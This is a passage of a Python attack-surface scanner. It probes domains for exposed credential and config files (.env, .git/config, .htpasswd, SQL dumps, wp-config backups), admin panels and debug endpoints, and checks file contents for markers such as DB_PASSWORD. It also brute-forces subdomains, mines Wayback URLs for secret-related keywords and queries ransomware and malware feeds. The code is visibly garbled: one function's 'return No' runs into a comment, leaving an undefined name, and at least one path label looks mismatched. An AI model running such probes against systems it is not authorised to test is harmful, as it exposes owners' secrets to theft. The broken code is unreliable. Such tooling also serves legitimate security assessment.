# 403/404 error page or the homepage — for *every* path. Without fingerprinting
# that behaviour first, every probed path looks like a "finding". These helpers
# probe a few random non-existent paths and record their (status, size) so real
# scanners can suppress responses that merely echo the catch-all.

def _catchall_baseline(domain, prefix="/", n=3, timeout=6):
    """
    Probe random non-existent paths and record how the host answers them.

    Returns a dict with the observed statuses and raw body sizes. Sizes are kept
    raw (not bucketed) because error pages usually echo the requested path back,
    so two catch-all responses differ by a few bytes — matching therefore uses a
    tolerance rather than an exact bucket, which previously let dozens of
    identical 403 pages through as separate "findings".
    """
    import random as _rnd
    import string as _s
    base = {"statuses": set(), "sizes": [], "redirect": False, "samples": []}
    if not HAS_REQUESTS:
        return base
    UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
    for scheme in ("https", "http"):
        got = False
        for _ in range(n):
            rnd = prefix.rstrip("/") + "/" + "".join(_rnd.choices(_s.ascii_lowercase + _s.digits, k=16))
            try:
                r = requests.get(f"{scheme}://{domain}{rnd}", timeout=timeout, verify=False,
                                 allow_redirects=False, headers=UA)
                base["statuses"].add(r.status_code)
                base["sizes"].append(len(r.content))
                if r.status_code in (301, 302, 307, 308):
                    base["redirect"] = True
                try:
                    base["samples"].append((r.text or "")[:600])
                except Exception:
                    pass
                got = True
            except Exception:
                pass
        if got:
            break   # one working scheme is enough
    return base


def _is_catchall(r, base):
    """
    True if response r is just the host's generic answer for any path.

    Matches on status + body size within a tolerance (path echoes change the
    length slightly), or on near-identical body text.
    """
    try:
        if not base or not base.get("sizes"):
            return False
        if r.status_code in (301, 302, 307, 308) and base.get("redirect"):
            return True
        if r.status_code not in base["statuses"]:
            return False
        size = len(r.content)
        for bs in base["sizes"]:
            # allow the larger of 256 bytes or 15% — covers echoed paths,
            # timestamps, request-ids and CSRF tokens in error pages
            if abs(size - bs) <= max(256, bs * 0.15):
                return True
        # fall back to comparing the body text itself
        try:
            txt = (r.text or "")[:600]
            for sample in base.get("samples", []):
                if txt and sample and _similar(txt, sample) > 0.85:
                    return True
        except Exception:
            pass
    except Exception:
        pass
    return False


def _similar(a, b):
    """Cheap similarity ratio between two short strings (0..1)."""
    try:
        import difflib
        return difflib.SequenceMatcher(None, a, b).quick_ratio()
    except Exception:
        return 0.0


def _body_fp(r, path=""):
    """
    Content fingerprint of a response, used to spot pages that are byte-for-byte
    the same generic template. The requested path and digits are removed first so
    a catch-all page that echoes the URL still fingerprints identically.
    """
    import hashlib
    import re as _re
    try:
        txt = (r.text or "")[:1200]
    except Exception:
        return ""
    if path:
        for v in {path, path.strip("/")}:
            if v and len(v) >= 3:
                txt = txt.replace(v, " ")
    txt = _re.sub(r'\d+', '#', txt)
    txt = _re.sub(r'\s+', ' ', txt).strip().lower()
    return hashlib.md5(txt.encode("utf-8", "replace")).hexdigest()


def _drop_uniform_findings(findings, key_status="status", key_size="size", min_group=4):
    """
    Safety net for catch-all hosts: drop findings that are all the *same page*.

    Grouping is by content fingerprint when available — grouping purely on
    response size wrongly discarded genuine small files (a 103-byte .git/config
    and an 85-byte .htpasswd look "uniform" by size but are entirely different
    documents). Size grouping is only used as a fallback, and then only for a
    large group whose sizes are nearly identical.
    """
    if not findings or len(findings) < min_group:
        return findings

    drop = set()

    # Preferred: identical content fingerprints = one generic template page
    fps = {}
    for f in findings:
        fp = f.get("body_fp")
        if fp:
            fps.setdefault(fp, []).append(f)
    for fp, items in fps.items():
        if len(items) >= min_group:
            for f in items:
                drop.add(id(f))

    # Fallback for findings without a fingerprint: require a big group with
    # near-identical sizes (±2%), which real, distinct files never produce.
    unfingerprinted = [f for f in findings if not f.get("body_fp")]
    if len(unfingerprinted) >= max(8, min_group):
        groups = {}
        for f in unfingerprinted:
            st, sz = f.get(key_status), f.get(key_size)
            if st in (None, "") or not isinstance(sz, int):
                continue
            groups.setdefault(st, []).append((sz, f))
        for st, items in groups.items():
            if len(items) < 8:
                continue
            sizes = sorted(s for s, _ in items)
            median = sizes[len(sizes) // 2]
            uniform = [f for s, f in items if abs(s - median) <= max(16, median * 0.02)]
            if len(uniform) >= 8:
                for f in uniform:
                    drop.add(id(f))

    return [f for f in findings if id(f) not in drop]


def _looks_like_html(content):
    """True if the body is an HTML page (so NOT a raw config/source/backup file)."""
    try:
        head = (content[:512] if isinstance(content, (bytes, bytearray)) else content[:512].encode("utf-8", "ignore")).lstrip().lower()
        return head.startswith(b"<!doctype") or head.startswith(b"<html") or b"<head" in head[:200] or b"<body" in head[:300]
    except Exception:
        return False


# Markers proving a raw sensitive file is genuinely exposed (not a 200 error page)
_RAWFILE_MARKERS = {
    ".git/config": [b"[core]", b"repositoryformatversion"],
    ".git/head": [b"ref:"],
    ".git/commit_editmsg": [],
    ".git/index": [b"DIRC"],
    ".git/logs": [b" commit", b" clone", b"@"],
    ".svn/entries": [b"svn", b"dir"],
    ".svn/wc.db": [b"SQLite format"],
    ".hg/hgrc": [b"[paths]", b"[ui]", b"default ="],
    ".htpasswd": [b":$", b":{", b":$apr1$"],
    ".env": [b"=", b"APP_", b"DB_", b"SECRET", b"KEY"],
    "wp-config": [b"DB_NAME", b"DB_PASSWORD", b"<?php", b"AUTH_KEY"],
    ".sql": [b"INSERT INTO", b"CREATE TABLE", b"DROP TABLE", b"-- "],
    ".ds_store": [b"Bud1", b"\x00\x00\x00\x01Bud1"],
    "backup": [b"PK\x03\x04", b"\x1f\x8b", b"SQLite", b"INSERT INTO", b"CREATE TABLE"],
}


def _rawfile_validated(path, content):
    """For raw-file paths, require file-specific markers so a 200 error/HTML
    page is not mistaken for real exposure. Returns True if it looks genuine."""
    p = path.lower()
    raw_hint = any(tok in p for tok in (
        "/.git", "/.svn", "/.hg", ".htpasswd", ".env", "wp-config", ".ds_store",
        "backup", "dump", ".sql", ".bak", "database", "db.sqlite", "/.aws", "config.php.bak"))
    if not raw_hint:
        return True   # not a raw-file path — no special validation needed
    body = content if isinstance(content, (bytes, bytearray)) else content.encode("utf-8", "ignore")
    if _looks_like_html(body):
        return False   # HTML page served instead of the raw file → false positive
    for key, markers in _RAWFILE_MARKERS.items():
        if key in p and markers:
            return any(mk in body for mk in markers)
    return True   # raw-ish path, non-HTML body, no strict markers defined → accept


# ═══════════════════════════════════════════════════════════════
# MODULE: SENSITIVE ENDPOINTS (50+ known paths)
# ═══════════════════════════════════════════════════════════════

def scan_endpoints(domain):
    """
    Probe 55+ well-known sensitive endpoints across categories:
    admin panels, config files, debug interfaces, API docs,
    frameworks, cloud metadata, CI/CD, monitoring, backups.
    Returns only those that respond (not 404).
    """
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    ENDPOINTS = [
        # ── Admin & Login panels ──
        ("/admin/",                    "Admin Panel",          "high"),
        ("/admin/login",               "Admin Login",          "high"),
        ("/administrator/",            "Administrator Panel",  "high"),
        ("/wp-admin/",                 "WordPress Admin",      "high"),
        ("/wp-login.php",              "WordPress Login",      "medium"),
        ("/phpmyadmin/",               "phpMyAdmin",           "critical"),
        ("/phpmyadmin/index.php",      "phpMyAdmin Index",     "critical"),
        ("/adminer.php",               "Adminer DB Tool",      "critical"),
        ("/adminer/",                  "Adminer DB Tool",      "critical"),
        ("/pma/",                      "phpMyAdmin (pma)",     "critical"),
        ("/cpanel/",                   "cPanel",               "critical"),
        ("/webmail/",                  "Webmail",              "medium"),
        ("/manager/html",              "Tomcat Manager",       "critical"),
        ("/manager/status",            "Tomcat Status",        "high"),
        ("/jenkins/",                  "Jenkins CI",           "high"),
        ("/jenkins/login",             "Jenkins Login",        "high"),
        ("/grafana/",                  "Grafana Dashboard",    "high"),
        ("/kibana/",                   "Kibana Dashboard",     "high"),
        ("/solr/",                     "Apache Solr",          "high"),
        # ── Config & Secrets ──
        ("/.env",                      ".env File",            "critical"),
        ("/.env.local",                ".env.local",           "critical"),
        ("/.env.production",           ".env.production",      "critical"),
        ("/.env.backup",               ".env.backup",          "critical"),
        ("/config.php",                "config.php",           "critical"),
        ("/configuration.php",         "Joomla Config",        "critical"),
        ("/wp-config.php.bak",         "WP Config Backup",     "critical"),
        ("/wp-config.php~",            "WP Config Backup ~",   "critical"),
        ("/database.yml",              "Rails DB Config",      "critical"),
        ("/application.yml",           "App Config YAML",      "high"),
        ("/settings.py",               "Django Settings",      "high"),
        ("/config.json",               "config.json",          "high"),
        ("/config.xml",                "config.xml",           "medium"),
        # ── Source Control ──
        ("/.git/config",               ".git Config",          "critical"),
        ("/.git/HEAD",                 ".git HEAD",            "critical"),
        ("/.git/COMMIT_EDITMSG",       ".git Commit Msg",      "high"),
        ("/.svn/entries",              "SVN Entries",          "high"),
        ("/.hg/",                      "Mercurial Repo",       "high"),
        # ── Backups & Dumps ──
        ("/backup.sql",                "SQL Backup",           "critical"),
        ("/dump.sql",                  "SQL Dump",             "critical"),
        ("/backup.zip",                "Backup ZIP",           "critical"),
        ("/backup.tar.gz",             "Backup TAR",           "critical"),
        ("/db.sqlite",                 "SQLite DB",            "critical"),
        ("/database.sql",              "Database SQL",         "critical"),
        # ── Debug & Info ──
        ("/phpinfo.php",               "phpinfo()",            "high"),
        ("/info.php",                  "phpinfo (info.php)",   "high"),
        ("/test.php",                  "test.php",             "medium"),
        ("/server-status",             "Apache server-status", "medium"),
        ("/server-info",               "Apache server-info",   "medium"),
        ("/_profiler/",                "Symfony Profiler",     "high"),
        ("/debug/",                    "Debug Endpoint",       "high"),
        ("/trace",                     "Trace Endpoint",       "medium"),
        # ── API & Documentation ──
        ("/api/",                      "API Root",             "info"),
        ("/api/v1/",                   "API v1",               "info"),
        ("/api/v2/",                   "API v2",               "info"),
        ("/graphql",                   "GraphQL Endpoint",     "medium"),
        ("/graphiql",                  "GraphiQL IDE",         "high"),
        ("/swagger-ui.html",           "Swagger UI",           "medium"),
        ("/swagger-ui/",               "Swagger UI Alt",       "medium"),
        ("/api-docs",                  "OpenAPI Docs",         "medium"),
        ("/api-docs.json",             "OpenAPI JSON",         "medium"),
        ("/.well-known/openid-configuration", "OIDC Config",  "info"),
        ("/.well-known/jwks.json",     "JWKS (JWT Keys)",      "medium"),
        # ── Cloud / Infrastructure ──
        ("/actuator",                  "Spring Actuator",      "high"),
        ("/actuator/env",              "Spring Actuator /env", "critical"),
        ("/actuator/health",           "Spring Actuator Health","info"),
        ("/actuator/metrics",          "Spring Actuator Metrics","medium"),
        ("/actuator/beans",            "Spring Actuator Beans","medium"),
        ("/actuator/mappings",         "Spring Actuator Maps", "medium"),
        ("/health",                    "Health Check",         "info"),
        ("/metrics",                   "Metrics Endpoint",     "medium"),
        ("/status",                    "Status Page",          "info"),
        # ── Miscellaneous known paths ──
        ("/xmlrpc.php",                "XML-RPC (WP)",         "medium"),
        ("/crossdomain.xml",           "crossdomain.xml",      "low"),
        ("/clientaccesspolicy.xml",    "Client Access Policy", "low"),
        ("/.DS_Store",                 ".DS_Store (macOS)",    "medium"),
        ("/Thumbs.db",                 "Thumbs.db",            "low"),
        ("/web.config",                "IIS web.config",       "high"),
        ("/WEB-INF/web.xml",           "Java WEB-INF",         "critical"),
        ("/docker-compose.yml",        "Docker Compose",       "high"),
        ("/Dockerfile",                "Dockerfile",           "medium"),
        ("/.htpasswd",                 ".htpasswd",            "critical"),
        ("/.htaccess",                 ".htaccess",            "medium"),

        # ── Additional exposures mined from the nuclei-templates repo ──
        ("/.gem/credentials", "Ruby Gem::ConfigFile Credential - Exposure", "high"),
        ("/.msmtprc", "Msmtp - Config Exposure", "high"),
        ("/.remote-sync.json", "Atom Synchronization Exposure", "high"),
        ("/collibra.properties", "Collibra Properties Exposure", "high"),
        ("/config/databases.yml", "Symfony Database Configuration File - Detect", "high"),
        ("/configuration.yml", "Redmine Configuration File - Detect", "high"),
        ("/db/robomongo.json", "RoboMongo Credential - Exposure", "high"),
        ("/kcfinder/browse.php", "KCFinder - Exposure", "high"),
        ("/requestlogs", "ServiceStack Request Logs - Unauthenticated Access", "high"),
        ("/sftp.json", "VSCode SFTP File Exposure", "high"),
        ("/webapi/v1/system/accountmanage/account", "Lvmeng - UTS Disclosure", "high"),
        ("/.claude/settings.json", "Claude Code Project Settings Exposure", "medium"),
        ("/.coveralls.yml", "Coveralls Configuration File Exposure", "medium"),
        ("/.git-credentials", "Git Credentials - Detect", "medium"),
        ("/.git/", "Git Metadata Directory Exposure", "medium"),
        ("/.htdeployment", ".htdeployment - Files Tree Cache File", "medium"),
        ("/.php_cs.cache", "PHP-CS-Fixer Cache - File Disclosure", "medium"),
        ("/.vscode/", "Visual Studio Code Directories - Detect", "medium"),
        ("/Properties/launchSettings.json", "ASP.NET Launch Settings - Exposure", "medium"),
        ("/_ignition/logs", "Laravel Ignition - Log Viewer Information Disclosure", "medium"),
        ("/appconfigs", "Apache Pinot - Exposure", "medium"),
        ("/appspec.yml", "Appspec YML/YAML - Detect", "medium"),
        ("/artifactory/api/build", "JFrog Artifactory Build - Exposure", "medium"),
        ("/azuredeploy.json", "Azure Resource Manager Template - File Exposure", "medium"),
        ("/filezilla.xml", "Filezilla", "medium"),
        ("/ioncube/loader-wizard.php", "ioncube Loader Wizard Disclosure", "medium"),
        ("/issues.json", "Redmine Issues - Exposure", "medium"),
        ("/lfm.php", "Lazy File Manager", "medium"),
        ("/prober.php", "PHP Prober - Exposure", "medium"),
        ("/static/shards.html", "NGINX Shards Disclosure", "medium"),
        ("/.apdisk", "Apdisk - File Disclosure", "low"),
        ("/.badarg.log", "Badarg Log File Exposure", "low"),
        ("/.composer-auth.json", "Composer-auth Json File Disclosure", "low"),
        ("/.editorconfig", "Editor Configuration File - Detect", "low"),
        ("/.gcloudignore", "Google Cloud Ignore File Exposure", "low"),
        ("/.mailmap", "Git Mailmap File Disclosure", "low"),
        ("/.phpunit.result.cache", "PHPUnit Result Cache File Exposure", "low"),
        ("/.viminfo", "Viminfo - File Disclosure", "low"),
        ("/.vscode/launch.json", "Visual Studio Code launch.json Exposure", "low"),
        ("/?view=log", "ZoneMinder System Log - Detect", "low"),
        ("/Trace.axd", "ASP.NET Trace.AXD - Exposure", "low"),
        ("/Vagrantfile", "Vagrantfile Exposure", "low"),
        ("/Wiki.jsp?page=SystemInfo", "Apache JSPWiki - User IP Enumeration", "low"),
        ("/access.log", "Publicly accessible access-log file", "low"),
        ("/admin/master/console/config", "Keycloak Admin Console Configuration Disclosure", "low"),
        ("/anonymous-cli-metrics.json", "NPM Anonymous CLI Metrics Json", "low"),
        ("/buildspec.yml", "AWS CodeBuild Build Spec - Exposure", "low"),
        ("/cfcache.map", "Discover Cold Fusion cfcache.map Files", "low"),
        ("/database_credentials.inc", "Database Credentials File Exposure", "low"),
        ("/go.mod", "Go.mod Disclosure", "low"),
        ("/google-services.json", "Google Service Json", "low"),
        ("/hopfully404", "Google API Key", "low"),
        ("/jsapi_ticket.json", "JsAPI Ticket Json", "low"),
        ("/log/system.log", "ICEFlow VPN Disclosure", "low"),
        ("/pantheon.upstream.yml", "Pantheon upstream.yml Disclosure", "low"),
        ("/php.ini", "Php.ini File Disclosure", "low"),
        ("/phpsysinfo/index.php?disp=bootstrap", "phpSysInfo Exposure", "low"),
        ("/stats?json", "OpenTSDB - Detect", "low"),
        ("/storage.yml", "Ruby on Rails storage.yml File Disclosure", "low"),
        ("/usage/", "Webalizer Xtended Statistics Exposed", "low"),
    ]

    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

    # Fingerprint catch-all / WAF behaviour first so we don't report the same
    # generic 403/404/homepage for every path.
    base_sigs = _catchall_baseline(domain)

    def probe(item):
        path, name, severity = item
        for scheme in ["https", "http"]:
            try:
                r = requests.get(
                    f"{scheme}://{domain}{path}",
                    timeout=5, allow_redirects=False,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"},
                    verify=False,
                )
                # Suppress catch-all responses (same as a random non-existent path)
                if _is_catchall(r, base_sigs) or _looks_soft_404(r):
                    return None
                if r.status_code not in (404, 410, 400, 501):
                    content_len = len(r.content)
                    if r.status_code in (200, 403, 500) and content_len > 0:
                        # Raw sensitive files must actually contain the file — a
                        # 200/403 HTML error page is a false positive.
                        if not _rawfile_validated(path, r.content):
                            return None
                        sev = severity
                        if r.status_code == 403:
                            sev = {"critical":"high","high":"medium","medium":"low","low":"info","info":"info"}.get(severity, severity)
                        return {
                            "path":         path,
                            "name":         name + (" [403 Forbidden]" if r.status_code == 403 else ""),
                            "severity":     sev,
                            "status":       r.status_code,
                            "size":         content_len,
                            "body_fp":      _body_fp(r, path),
                            "url":          f"{scheme}://{domain}{path}",
                            "content_type": r.headers.get("Content-Type", "")[:40],
                        }
                break
            except Exception:
                break
        return None

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        raw = list(ex.map(probe, ENDPOINTS))

    found = sorted(
        [r for r in raw if r is not None],
        key=lambda x: (sev_order.get(x["severity"], 99), x["path"])
    )
    # Catch-all safety net: many rows sharing one status AND the same response
    # size are the host's single generic page, not distinct discoveries.
    _before = len(found)
    found = _drop_uniform_findings(found)
    _suppressed = _before - len(found)

    counts = {}
    for f in found:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    return {
        "total_probed":    len(ENDPOINTS),
        "total_found":     len(found),
        "suppressed_generic": _suppressed,
        "severity_counts": counts,
        "findings":        found,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: SCREENSHOT (playwright → requests fallback)
# ═══════════════════════════════════════════════════════════════

def scan_screenshot(domain):
    """
    Site overview card:
    - thum.io screenshot (browser-rendered)
    - Page title + meta description
    - Favicon URL
    - Ransomware feed check (ransomware.live v2 API — no key needed, set RANSOMWARE_LIVE_API_KEY for pro)
    - Threat feed mentions (URLhaus, VirusTotal public)
    """
    import shutil

    result = {
        "method":        "thumio",
        "url":           f"https://{domain}",
        "public_url":    f"https://image.thum.io/get/width/1280/crop/800/noanimate/https://{domain}",
        "title":         None,
        "description":   None,
        "favicon_url":   f"https://www.google.com/s2/favicons?domain={domain}&sz=64",
        "logo_url":      f"https://logo.clearbit.com/{domain}",
        "ransomware":    [],
        "threat_feeds":  {},
        "cms":           None,
    }

    # ── Playwright local capture (best quality, optional) ──
    if shutil.which("playwright") or _has_playwright():
        try:
            pw = _screenshot_playwright(domain)
            if pw:
                result["method"] = "playwright"
                result["data"]   = pw.get("data")
                result["format"] = "base64_png"
        except Exception:
            pass

    # ── Fetch page title + meta description ──
    try:
        r = req(f"https://{domain}", timeout=10)
        if r and r.text:
            import re as _re
            t = _re.search(r"<title[^>]*>([^<]+)</title>", r.text, _re.I)
            if t:
                result["title"] = t.group(1).strip()[:120]
            d = _re.search(r'<meta[^>]+name=.description.[^>]+content=.([^"\'>]+).', r.text, _re.I)
            if not d:
                d = _re.search(r'<meta[^>]+content=.([^"\'>]+).[^>]+name=.description.', r.text, _re.I)
            if d:
                result["description"] = d.group(1).strip()[:250]
            # Detect CMS
            body = r.text.lower()
            if "wp-content" in body or "wp-includes" in body:
                result["cms"] = "WordPress"
            elif "joomla" in body:
                result["cms"] = "Joomla"
            elif "drupal" in body:
                result["cms"] = "Drupal"
            elif "shopify" in body:
                result["cms"] = "Shopify"
            elif "wix.com" in body:
                result["cms"] = "Wix"
    except Exception:
        pass

    # ── Ransomware.live v2 API — no auth, no key needed ──
    # Base URL: https://api.ransomware.live/v2
    # Correct endpoint: /searchvictims/<keyword>
    import os
    rw_api_key = os.environ.get("RANSOMWARE_LIVE_API_KEY", "").strip()
    rw_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "Accept": "application/json"}
    if rw_api_key:
        rw_headers["X-API-Key"] = rw_api_key

    def rw_get(url):
        try:
            r = requests.get(url, headers=rw_headers, timeout=12, verify=False, allow_redirects=True)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return No# Validate: only include victims that actually relate to our domain
    def _rw_match(v, dom):
        vn = (v.get("victim") or v.get("company") or "").lower()
        vw = (v.get("website") or v.get("url") or "").lower()
        dl = dom.lower()
        if dl in vw or dl in vn: return True
        base = dl.split(".")[0]
        if len(base) >= 5:
            import re as _re
            pat = r'(?<![a-z0-9])' + _re.escape(base) + r'(?![a-z0-9])'
            if _re.search(pat, vn) or _re.search(pat, vw): return True
        return False

    # Search full domain
    try:
        hits = rw_get(f"https://api.ransomware.live/v2/searchvictims/{domain}")
        if isinstance(hits, list):
            for v in hits[:10]:
                if _rw_match(v, domain):
                    result["ransomware"].append({
                        "group":       v.get("group", v.get("group_name", "")),
                        "date":        (v.get("attackdate") or v.get("discovered") or "")[:10],
                        "description": (v.get("description") or v.get("summary") or "")[:200],
                        "victim":      v.get("victim", ""),
                        "country":     v.get("country", ""),
                        "url":         v.get("website", v.get("url", "")),
                    })
    except Exception:
        pass

    # Search org name only if ≥5 chars (prevents short words from matching unrelated victims)
    try:
        base = domain.split(".")[0]
        if len(base) >= 5:
            hits2 = rw_get(f"https://api.ransomware.live/v2/searchvictims/{base}")
            if isinstance(hits2, list):
                existing = {r.get("victim","") for r in result["ransomware"]}
                for v in hits2[:10]:
                    if v.get("victim","") not in existing and _rw_match(v, domain):
                        result["ransomware"].append({
                            "group":       v.get("group", v.get("group_name", "")),
                            "date":        (v.get("attackdate") or v.get("discovered") or "")[:10],
                            "description": (v.get("description") or v.get("summary") or "")[:200],
                            "victim":      v.get("victim", ""),
                            "country":     v.get("country", ""),
                            "url":         v.get("website", v.get("url", "")),
                        })
    except Exception:
        pass

    if result["ransomware"]:
        result["ransomware_status"] = "found"
    else:
        result["ransomware_status"] = "clean"

    # ── URLhaus — malware URL database (no auth needed) ──
    try:
        r = requests.post(
            "https://urlhaus-api.abuse.ch/v1/host/",
            data={"host": domain},
            timeout=8,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"},
        )
        if r and r.status_code == 200:
            j = r.json()
            if j.get("query_status") != "no_results":
                result["threat_feeds"]["urlhaus"] = {
                    "status":     j.get("query_status", ""),
                    "urls_count": len(j.get("urls", [])),
                    "blacklists": j.get("blacklists", {}),
                }
    except Exception:
        pass

    return result


def _has_playwright():
    try:
        import playwright  # noqa
        return True
    except ImportError:
        return False


def _screenshot_playwright(domain):
    import base64
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-setuid-sandbox"])
        page = browser.new_page(viewport={"width": 1280, "height": 800})
        page.goto(f"https://{domain}", wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(2000)
        png_bytes = page.screenshot(full_page=False)
        browser.close()
        b64 = base64.b64encode(png_bytes).decode()
        return {
            "method": "playwright",
            "format": "base64_png",
            "data": b64,
            "url": f"https://{domain}",
            "size": len(png_bytes),
        }


# ═══════════════════════════════════════════════════════════════
# MODULE: WAYBACK
# ═══════════════════════════════════════════════════════════════

def scan_wayback(domain):
    results = {"snapshot": None, "urls": [], "interesting": []}

    r = req(f"https://archive.org/wayback/available?url={domain}", timeout=15)
    if r:
        try:
            snap = r.json().get("archived_snapshots", {}).get("closest", {})
            if snap:
                results["snapshot"] = {"timestamp": snap.get("timestamp", "")[:8], "url": snap.get("url", "")}
        except Exception:
            pass

    r = req(f"https://web.archive.org/cdx/search/cdx?url=*.{domain}&output=json&fl=timestamp,original,statuscode&collapse=urlkey&limit=150", timeout=20)
    if r:
        try:
            data = r.json()
            if len(data) > 1:
                rows = data[1:]
                urls = set(row[1] for row in rows)
                timestamps = sorted([row[0] for row in rows])
                results["urls"] = list(urls)[:100]
                results["range"] = f"{timestamps[0][:4]} - {timestamps[-1][:4]}" if timestamps else ""
                results["total"] = len(urls)

                interesting_kw = ["admin", "login", "api", "config", "backup", ".env", ".git",
                                  "wp-admin", "phpmyadmin", "debug", "test", "staging", ".sql",
                                  ".bak", "password", "secret", "token", ".log"]
                results["interesting"] = [u for u in urls if any(k in u.lower() for k in interesting_kw)][:20]
        except Exception:
            pass
    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: SUBDOMAIN BRUTE FORCE
# ═══════════════════════════════════════════════════════════════

def scan_bruteforce(domain):
    wordlist = [
        "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "ns3",
        "dns", "mx", "cloud", "git", "gitlab", "jenkins", "api", "dev", "staging",
        "stg", "test", "beta", "alpha", "demo", "app", "apps", "admin", "panel",
        "portal", "dashboard", "monitor", "grafana", "kibana", "vpn", "remote",
        "rdp", "ssh", "proxy", "cdn", "static", "assets", "img", "images", "media",
        "files", "docs", "wiki", "blog", "forum", "shop", "store", "pay", "billing",
        "support", "help", "status", "db", "database", "mysql", "postgres", "redis",
        "elastic", "mongo", "backup", "bk", "old", "legacy", "new", "v2", "m", "mobile",
        "sso", "auth", "login", "oauth", "id", "accounts", "ci", "cd", "deploy",
        "build", "registry", "docker", "k8s", "sentry", "jira", "confluence",
        "s3", "storage", "archive", "logs", "metrics", "api2", "gateway", "gw",
        "sandbox", "qa", "uat", "preprod", "crm", "erp", "upload", "download",
        "autodiscover", "exchange", "owa", "cpanel", "whm", "plesk", "webmin",
    ]

    # ── Wildcard DNS detection ──
    # If a random subdomain resolves, the domain uses wildcard DNS.
    # All results would be false positives — mark them accordingly.
    import random, string
    wildcard_ip = None
    try:
        rand_sub = "".join(random.choices(string.ascii_lowercase, k=12))
        wc = socket.getaddrinfo(f"{rand_sub}.{domain}", None, socket.AF_INET, socket.SOCK_STREAM)
        wildcard_ip = wc[0][4][0]
    except Exception:
        pass  # No wildcard — good

    def check(prefix):
        fqdn = f"{prefix}.{domain}"
        try:
            r = socket.getaddrinfo(fqdn, None, socket.AF_INET, socket.SOCK_STREAM)
            ip = r[0][4][0]
            # Skip if it resolves to the wildcard IP (false positive)
            if wildcard_ip and ip == wildcard_ip:
                return {"subdomain": fqdn, "ip": ip, "alive": False, "wildcard": True}
            # Verify it's a real host — do an HTTP probe, skip pure redirects
            try:
                probe = requests.get(
                    f"https://{fqdn}", timeout=4, allow_redirects=False,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}, verify=False
                )
                # Accept 200, 401, 403, 404, 500 — these are real responses
                # Reject 301/302 that redirect OUT of the domain (catches wildcard CDN redirects)
                if probe.status_code in (301, 302, 307, 308):
                    location = probe.headers.get("location", "")
                    if domain not in location:
                        return {"subdomain": fqdn, "ip": ip, "alive": False, "redirect": location}
            except Exception:
                pass  # Can't HTTP probe — DNS hit is enough evidence
            return {"subdomain": fqdn, "ip": ip, "alive": True}
        except Exception:
            return {"subdomain": fqdn, "ip": None, "alive": False}

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        results = list(ex.map(check, wordlist))

    found = [r for r in results if r["alive"]]
    return {
        "found": found,
        "total_checked": len(wordlist),
        "wildcard_detected": wildcard_ip is not None,
        "wildcard_ip": wildcard_ip,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: SUBDOMAIN SCANNER (multi-source)
# ═══════════════════════════════════════════════════════════════

def scan_subdomains(domain):
    """
    Aggregate subdomains from 4 free passive sources (no API keys):
      1. crt.sh   — certificate transparency logs
      2. HackerTarget — hostsearch API
      3. RapidDNS — web scrape
      4. AlienVault OTX — passive DNS
    Then resolve all unique results in parallel.
    """
    subs = set()
    sources_used = []
    sources_failed = []

    # --- Source 1: crt.sh ---
    try:
        r = req(f"https://crt.sh/?q=%.{domain}&output=json", timeout=25)
        if r:
            for entry in r.json():
                for name in entry.get("name_value", "").split("\n"):
                    name = name.strip().lower().lstrip("*.")
                    if name and name.endswith(f".{domain}") and name != domain:
                        subs.add(name)
            sources_used.append("crt.sh")
        else:
            sources_failed.append("crt.sh")
    except Exception:
        sources_failed.append("crt.sh")

    # --- Source 2: HackerTarget hostsearch (free tier, no key) ---
    try:
        r = req(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=15)
        if r and r.text and "error" not in r.text.lower()[:30]:
            for line in r.text.strip().split("\n"):
                parts = line.split(",")
                if parts:
                    name = parts[0].strip().lower()
                    if name.endswith(f".{domain}") and name != domain:
                        subs.add(name)
            sources_used.append("hackertarget")
        else:
            sources_failed.append("hackertarget")
    except Exception:
        sources_failed.append("hackertarget")

    # --- Source 3: RapidDNS ---
    try:
        r = req(f"https://rapiddns.io/subdomain/{domain}?full=1", timeout=15,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
        if r:
            found = re.findall(r'<td>([a-zA-Z0-9\-\.]+\.' + re.escape(domain) + r')</td>', r.text)
            for name in found:
                name = name.strip().lower()
                if name.endswith(f".{domain}") and name != domain:
                    subs.add(name)
            sources_used.append("rapiddns")
        else:
            sources_failed.append("rapiddns")
    except Exception:
        sources_failed.append("rapiddns")

    # --- Source 4: AlienVault OTX passive DNS ---
    try:
        r = req(f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns", timeout=15)
        if r:
            data = r.json()
            for entry in data.get("passive_dns", []):
                hostname = entry.get("hostname", "").strip().lower()
                if hostname.endswith(f".{domain}") and hostname != domain:
                    subs.add(hostname)
            sources_used.append("alienvault")
        else:
            sources_failed.append("alienvault")
    except Exception:
        sources_failed.append("alienvault")

    subs = sorted(subs)

    # --- Resolve all found subdomains in parallel ---
